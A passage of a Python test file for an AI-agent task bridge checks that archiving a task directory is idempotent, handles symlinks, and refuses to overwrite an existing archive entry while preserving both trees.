        assert (archive / task_id).is_symlink()
        assert marker.read_text(encoding="utf-8") == "keep"

    def test_repeated_archive_is_idempotent_after_first_move(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        source = tmp_path / ".ai-bridge" / "tasks" / task_id
        source.mkdir(parents=True)
        (source / "source.txt").write_text("source", encoding="utf-8")
        runner = self._shell_runner(tmp_path)

        first = archive_agent_task(runner, project="p", task_id=task_id)
        second = archive_agent_task(runner, project="p", task_id=task_id)

        destination = tmp_path / ".ai-bridge" / "archive" / task_id
        assert first == {"stdout": f"archived {task_id}", "stderr": "", "exit_code": 0}
        assert second == {
            "stdout": f"already archived {task_id}",
            "stderr": "",
            "exit_code": 0,
        }
        assert not source.exists()
        assert (destination / "source.txt").read_text(encoding="utf-8") == "source"

    def test_existing_archive_entry_is_bounded_and_preserves_both_trees(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        source = tmp_path / ".ai-bridge" / "tasks" / task_id
        source.mkdir(parents=True)
        (source / "source.txt").write_text("source", encoding="utf-8")
        destination = tmp_path / ".ai-bridge" / "archive" / task_id
        destination.mkdir(parents=True)
        (destination / "archived.txt").write_text("archive", encoding="utf-8")

        result = archive_agent_task(self._shell_runner(tmp_path), project="p", task_id=task_id)

        assert result["exit_code"] == 1
        assert "already contains" in result["stderr"]
        assert (source / "source.txt").read_text(encoding="utf-8") == "source"
        assert (destination / "archived.txt").read_text(encoding="utf-8") == "archive"
